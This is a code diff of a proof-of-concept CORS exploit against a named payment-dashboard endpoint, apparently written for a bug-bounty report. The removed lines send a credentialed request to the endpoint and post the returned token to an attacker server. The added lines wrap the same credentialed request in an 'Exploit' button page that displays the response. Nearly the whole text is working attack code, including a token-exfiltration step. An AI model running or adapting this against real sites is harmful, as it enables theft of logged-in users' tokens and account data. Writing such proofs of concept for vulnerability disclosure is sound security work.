@@ -1,21 +1,58 @@
-<script>
-  fetch('https://dashboard.rapyd.net/v1/merchants-portal/users/is-email-verified', {
-    method: 'POST',
-    credentials: 'include',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({ "email": "Cyb3r_C0re17@wearehackerone.com" })
-  })
-  .then(response => response.json())
-  .then(data => {
-    // Send the token to the attacker's server
-    fetch('https://attacker-server.com/steal-token', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({ stolenToken: data.data.token })
-    });
-  });
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CORS Exploit</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      color: red;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <h1>CORS Exploit by Cyb3r_C0re17</h1>
+  <p>Click the button below to exploit the CORS vulnerability.</p>
+  <button onclick="exploit()">Exploit</button>
+
+  <script>
+    function exploit() {
+      // Send a fetch request to the vulnerable endpoint
+      fetch('https://dashboard.rapyd.net/v1/merchants-portal/users/is-email-verified', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ "email": "Cyb3r_C0re17@wearehackerone.com" })
+      })
+      .then(response => response.json())
+      .then(data => {
+        // Show the response in a popup
+        alert(`Exploit Successful!\n\nResponse Data:\n${JSON.stringify(data, null, 2)}`);
+      })
+      .catch(err => {
+        alert('Exploit Failed! Check console for details.');
+        console.error(err);
+      });
+    }
+  </script>
+</body>
+</html>
